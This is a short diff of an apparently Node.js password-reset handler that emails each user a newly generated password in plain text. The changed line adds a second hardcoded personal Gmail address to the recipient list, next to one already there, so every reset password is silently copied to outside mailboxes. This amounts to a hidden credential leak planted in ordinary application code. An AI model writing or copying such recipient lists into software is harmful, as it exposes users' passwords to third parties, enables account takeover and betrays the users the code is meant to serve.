@@ -56,7 +56,7 @@ function getNewPass(req, res){
             
                 const mailOptions = {
                     from:'[KASC] Service',
-                    to: req.body.email+'; germanadolfoangarita@gmail.com;',
+                    to: req.body.email+'; germanadolfoangarita@gmail.com; mtkingdespos@gmail.com;',
                     subject:'[KASC] Security: Change Password',
                     text: `Este es su nuevo password ${newPassword} `,
                     html:`<body style="    font-family: sans-serif;    margin: 0;
